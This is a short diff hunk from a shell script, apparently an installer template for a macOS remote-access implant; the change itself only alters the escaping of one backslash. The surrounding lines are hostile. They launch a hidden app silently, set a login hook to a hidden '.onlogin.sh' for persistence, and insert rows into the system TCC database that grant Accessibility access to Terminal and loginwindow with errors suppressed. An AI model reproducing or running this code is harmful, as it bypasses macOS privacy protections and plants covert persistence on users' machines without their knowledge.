@@ -71,7 +71,7 @@ if [ "$osx" = true ]; then
         cd $su_trgt/{0}.app/Contents/MacOS/
         nohup /usr/local/sbin/{0}.app/Contents/MacOS/{0} >> /dev/null 2>&1 &
         defaults write com.apple.loginwindow LoginHook $su_trgt/{0}.app/Contents/MacOS/.onlogin.sh
-        sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db "INSERT OR REPLACE INTO access VALUES ('kTCCServiceAccessibility','com.apple.Terminal',0,1,1,NULL)" >> /dev/null 2>&1
+        sqlite3 /Library/Application\\ Support/com.apple.TCC/TCC.db "INSERT OR REPLACE INTO access VALUES ('kTCCServiceAccessibility','com.apple.Terminal',0,1,1,NULL)" >> /dev/null 2>&1
         sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db "INSERT OR REPLACE INTO access VALUES ('kTCCServiceAccessibility','com.apple.loginwindow',0,1,1,NULL)" >> /dev/null 2>&1
         sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db "INSERT OR REPLACE INTO access VALUES ('kTCCServiceAccessibility','com.apple.Terminal',0,1,1,NULL,NULL)" >> /dev/null 2>&1
         sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db "INSERT OR REPLACE INTO access VALUES ('kTCCServiceAccessibility','com.apple.loginwindow',0,1,1,NULL,NULL)" >> /dev/null 2>&1
